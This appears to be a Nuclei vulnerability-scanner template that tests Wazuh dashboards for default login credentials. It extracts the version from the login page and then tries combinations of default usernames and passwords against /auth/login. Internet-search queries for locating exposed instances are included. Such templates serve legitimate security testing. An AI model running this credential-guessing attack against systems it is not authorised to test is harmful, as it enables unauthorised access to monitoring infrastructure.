id: wazuh-default-login

info:
  name: Wazuh - Default Login
  author: theamanrawat,denandz,PulseSecurity.co.nz
  severity: high
  description: |
    Wazuh default login credentials were discovered.
  reference:
    - https://documentation.wazuh.com/current/user-manual/user-administration/password-management.html
    - https://wazuh.com
    - https://documentation.wazuh.com/current/deployment-options/docker/wazuh-container.html#single-node-deployment
  classification:
    cpe: cpe:2.3:a:wazuh:wazuh:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 7
    vendor: wazuh
    product: wazuh
    shodan-query: http.title:"wazuh"
    fofa-query:
      - app="wazuh"
      - title="wazuh"
    google-query: intitle:"wazuh"
    runzero-match: any(each(service["html.titles"]), {# matches "Wazuh"})
  tags: wazuh,default-login

http:
  - method: GET
    path:
      - "{{BaseURL}}/app/login"

    extractors:
      - type: regex
        part: body
        name: osd
        group: 1
        internal: true
        regex:
          - '&quot;version&quot;:&quot;([0-9.]+)&quot;'

  - raw:
      - |
        POST /auth/login HTTP/1.1
        Host: {{Hostname}}
        Osd-Version: {{osd}}
        osd-xsrf: osd-fetch
        Content-Type: application/json

        {"username":"{{username}}","password":"{{password}}"}

    attack: clusterbomb
    payloads:
      username:
        - "admin"
        - "wazuh"
      password:
        - "admin"
        - "wazuh"
        - "SecretPassword"
    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"username":'
          - '"roles":'
        condition: and

      - type: word
        part: header
        words:
          - 'application/json'
        condition: and

      - type: status
        status:
          - 200

